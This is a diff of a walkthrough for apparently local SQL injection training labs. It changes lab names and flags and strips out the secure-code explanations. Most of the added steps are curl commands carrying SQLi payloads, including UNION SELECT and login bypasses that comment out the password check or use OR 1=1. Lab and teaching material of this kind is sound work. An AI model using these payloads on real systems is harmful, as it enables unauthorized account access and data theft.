@@ -62,42 +62,78 @@ db.query(query, ['%' + userInput + '%']);
 ## LAB 1: Search Menu (EASY - Recon)
 
 **URL:** http://localhost:3005/lab1  
-**Challenge:** Test menu search functionality  
+**Challenge:** Test product search functionality  
 **Stage:** Recon  
 
 ### Vulnerability
-This lab is **intentionally secure** to demonstrate proper implementation. Students should understand what secure code looks like.
+This lab demonstrates **secure implementation** using parameterized queries. Students should understand proper defenses.
+
+### Required Tools
+- `curl` - HTTP API testing
+- Browser - Manual testing
 
 ### Exploitation Steps
 
-1. **Test Basic Search:**
+1. **Test Normal Search:**
    ```bash
-   curl "http://localhost:3005/api/search?q=berry"
+   curl "http://localhost:3005/api/search?q=laptop"
    ```
 
-2. **Try SQL Injection Payloads:**
+2. **Attempt SQL Injection:**
    ```bash
+   # Test various SQLi payloads (these will be safely handled)
    curl "http://localhost:3005/api/search?q=' OR '1'='1"
+   curl "http://localhost:3005/api/search?q=laptop'--"
+   curl "http://localhost:3005/api/search?q=' UNION SELECT * FROM products--"
    ```
 
-3. **Result:** Search works correctly but safely handles special characters
+3. **Observe Secure Behavior:**
+   - No SQL errors exposed
+   - Payloads treated as literal search strings
+   - Application handles special characters safely
 
 ### Flag
-`FRESHBLEND{M3NU_S34RCH_W0RK1NG}` (awarded for understanding secure implementation)
+`NSA{SQL_1NJ3CT10N_M1T1G4T3D}`
 
-### Why This Is Secure
-```javascript
-app.get('/api/search', (req, res) => {
-    const searchTerm = req.query.q || '';
-    
-    // SECURE: Uses parameterized query
-    const query = 'SELECT * FROM smoothies WHERE name LIKE $1';
-    db.query(query, ['%' + searchTerm + '%'], (err, result) => {
-        if (err) {
-            // Secure error handling - no details exposed
-            return res.status(500).json({ error: 'Search failed' });
-        }
-        res.json({ success: true, results: result.rows });
+### Key Learning
+This endpoint is intentionally secure to demonstrate proper parameterized query implementation.
+
+---
+
+## LAB 2: Advanced Search (MEDIUM - Initial Access)
+
+**URL:** http://localhost:3005/lab2  
+**Challenge:** Exploit SQL injection in advanced search filters  
+**Stage:** Initial Access  
+
+### Vulnerability
+String concatenation in SQL query allows injection attacks.
+
+### Required Tools
+- `curl` - HTTP API testing
+- `jq` - JSON parsing
+
+### Exploitation Steps
+
+1. **Test for SQL Errors:**
+   ```bash
+   # Single quote triggers SQL error
+   curl "http://localhost:3005/api/advanced-search?q=test'" 
+   curl "http://localhost:3005/api/advanced-search?category=classic'"
+   ```
+
+2. **Confirm Vulnerability:**
+   ```bash
+   # SQL injection patterns
+   curl "http://localhost:3005/api/advanced-search?q=' OR '1'='1"
+   curl "http://localhost:3005/api/advanced-search?category=' OR '1'='1"
+   ```
+
+3. **Extract Flag:**
+   ```bash
+   # Flag appears in error response
+   curl -s "http://localhost:3005/api/advanced-search?q='" | jq '.flag'
+   ```
     });
 });
 ```
@@ -139,69 +175,7 @@ SQL injection in advanced search with multiple parameters. Query errors are expo
    ```
 
 ### Flag
-`FRESHBLEND{SQL_3RR0R_D3T3CT3D}`
-
-### Vulnerable Response
-```json
-{
-  "success": false,
-  "error": "SQL Error Detected",
-  "flag": "FRESHBLEND{SQL_3RR0R_D3T3CT3D}",
-  "hint": "The query was: SELECT * FROM smoothies WHERE name LIKE '%berry'%' AND category = 'fruit'",
-  "message": "SQL injection attempt detected. Your payload modified the query structure."
-}
-```
-
-### Vulnerable Code Pattern
-```javascript
-app.get('/api/advanced-search', (req, res) => {
-    const { q, category } = req.query;
-    
-    // VULNERABILITY: String concatenation allows injection
-    const query = `SELECT * FROM smoothies 
-                   WHERE name LIKE '%${q}%' 
-                   AND category = '${category}'`;
-    
-    // Detection logic (for educational purposes)
-    if (q.includes("'") || q.includes("--") || q.includes("OR")) {
-        return res.json({
-            success: false,
-            error: "SQL Error Detected",
-            flag: "FRESHBLEND{SQL_3RR0R_D3T3CT3D}",
-            hint: `The query was: ${query}`
-        });
-    }
-    
-    db.query(query);
-});
-```
-
-### Secure Implementation
-```javascript
-app.get('/api/advanced-search', (req, res) => {
-    const { q, category } = req.query;
-    
-    // SECURE: Parameterized query
-    const query = `SELECT * FROM smoothies 
-                   WHERE name LIKE $1 
-                   AND category = $2`;
-    
-    db.query(query, [`%${q}%`, category], (err, result) => {
-        if (err) {
-            // Secure error handling
-            console.error('Database error:', err);
-            return res.status(500).json({ error: 'Search failed' });
-        }
-        res.json({ success: true, results: result.rows });
-    });
-});
-```
-
-### Teaching Points
-- SQL errors reveal query structure to attackers
-- String concatenation is vulnerable
-- Input validation alone is insufficient
-- Always use parameterized queries
+`NSA{SQL_3RR0R_F0UND}`
 
 ---
 
@@ -212,6 +186,57 @@ app.get('/api/advanced-search', (req, res) => {
 **Stage:** Initial Access  
 
 ### Vulnerability
+SQL injection in login form allows authentication bypass and admin access without password.
+
+### Required Tools
+- `curl` - HTTP POST requests
+- `jq` - JSON parsing
+
+### Exploitation Steps
+
+1. **Test Normal Login (will fail):**
+   ```bash
+   curl -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"test@example.com", "password":"wrongpass"}'
+   ```
+
+2. **Comment-Based SQLi - Bypass Password Check:**
+   ```bash
+   # Classic SQL injection: admin email + comment out password
+   curl -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"admin@shoptech.com'\''--", "password":"anything"}'
+   ```
+
+3. **OR-Based SQLi - Always True Condition:**
+   ```bash
+   # OR 1=1 makes condition always true
+   curl -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"'\'' OR '\''1'\''='\''1", "password":"'\'' OR '\''1'\''='\''1"}'
+   ```
+
+4. **Extract Flag:**
+   ```bash
+   # Successful bypass returns flag
+   curl -s -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"admin@shoptech.com'\''--", "password":"any"}' \
+     | jq '.flag'
+   ```
+
+5. **Alternative Payloads:**
+   ```bash
+   # Various working payloads
+   curl -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"admin@shoptech.com'\'' #", "password":"any"}'
+   
+   curl -X POST http://localhost:3005/api/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"admin@shoptech.com'\'' OR 1=1--", "password":""}'
+   ```
 Authentication bypass through SQL injection in login form. Vulnerable query allows attackers to manipulate login logic.
 
 ### Exploitation Steps
